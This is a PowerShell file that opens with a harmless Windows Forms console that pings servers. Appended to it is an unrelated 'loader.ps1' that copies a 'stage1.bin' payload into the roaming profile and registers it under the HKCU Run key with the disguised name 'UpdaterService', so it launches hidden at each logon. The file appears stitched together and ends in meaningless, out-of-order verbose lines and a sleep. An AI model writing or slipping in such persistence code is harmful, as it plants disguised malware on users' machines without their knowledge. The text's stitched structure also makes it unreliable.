
$ErrorActionPreference = 'Stop'

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Contoso Agent Console'
$form.Size = New-Object System.Drawing.Size(700, 440)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('web-prod-03', 'filesrv01', 'sql-prod-02', 'web-stg-01')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$button = New-Object System.Windows.Forms.Button
$button.Text = 'Probe'
$button.Location = New-Object System.Drawing.Point(620, 18)
$button.Size = New-Object System.Drawing.Size(100, 28)
$button.Add_Click({
    $button.Enabled = $false
    $statusLabel.Text = 'Checking ...'
    try {
        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
        if ($reachable) {
            $statusLabel.Text = 'Online'
            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
        }
        else {
            $statusLabel.Text = 'Offline'
            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
        }
    }
    catch {
        $statusLabel.Text = 'Error'
        Write-Warning $_.Exception.Message
    }
    finally {
        $button.Enabled = $true
    }
})
$form.Controls.Add($button)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(18, 64)
$listBox.Size = New-Object System.Drawing.Size(700, 300)
$form.Controls.Add($listBox)
foreach ($server in $script:servers) {
    [void]$listBox.Items.Add($server)
}

$form.Add_Shown({ $textBox.Focus() })
[void]$form.ShowDialog()
$form.Dispose()
<#
.SYNOPSIS
    Run-key persistence workflow.

.DESCRIPTION
    Installs the launcher under the roaming profile,
    writes the Run-key value, then re-reads the value to confirm
    that the registration is present.

.NOTES
    Targets are limited to the current user's profile.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    [string]$RegistryValue = 'UpdaterService',
    [string]$PersistencePath = "$env:APPDATA\stage2.ps1",
    [string]$LogPath = "$env:TEMP\transfer.log"
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Payload install
function Install-StagePayload {
    [CmdletBinding()]
    param(
        [string]$SourcePath = "",
        [string]$DestinationPath = ""
    )

    if (-not (Test-Path -Path $SourcePath)) {
        throw "Source payload is missing"
    }
    Copy-Item -Path $SourcePath -Destination $DestinationPath -Force
    return (Test-Path -Path $DestinationPath)
}

# Registry write
function Set-RunKeyPersistence {
    [CmdletBinding()]
    param(
        [string]$KeyPath = "",
        [string]$ValueName = "",
        [string]$TargetPath = ''
    )

    Write-Verbose ("Writing Run value " + $ValueName)
    New-ItemProperty -Path $KeyPath -Name $ValueName -Value ('powershell.exe -NoP -File "' + $TargetPath + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
    return (Get-ItemProperty -Path $KeyPath -Name $ValueName -ErrorAction SilentlyContinue)
}

try {
    Write-StageLog -Message "Starting persistence stage"
    $InstallResult = Install-StagePayload -SourcePath 'C:\ProgramData\stage1.bin' -DestinationPath $PersistencePath
    if ($InstallResult) {
        $StageResult = Set-RunKeyPersistence -KeyPath $RunKeyPath -ValueName $RegistryValue -TargetPath $PersistencePath
        Write-StageLog -Message "Run key written"
    }
    else {
        Write-Warning "Payload copy did not complete"
    }
}
catch {
    Write-Warning "Persistence workflow failed: $($_.Exception.Message)"
}

$PersistenceReport = [ordered]@{
    Stage = "persistence"
    RunKey = $RunKeyPath
    ValueName = $RegistryValue
    Target = $PersistencePath
}
$PersistenceReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Stage handoff finished"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Validating result"
Write-Verbose "Collecting host metadata"
Write-Verbose "Starting workflow"
Write-Verbose "Exporting operation report"
Write-Verbose "Operation completed"
Write-Verbose "Applying operation timeout"
Write-Verbose "Inspecting process list"
Write-Verbose "Resolving configured target"
Write-Verbose "Reading configuration values"
Write-Verbose "Writing diagnostic marker"
Start-Sleep -Seconds 43
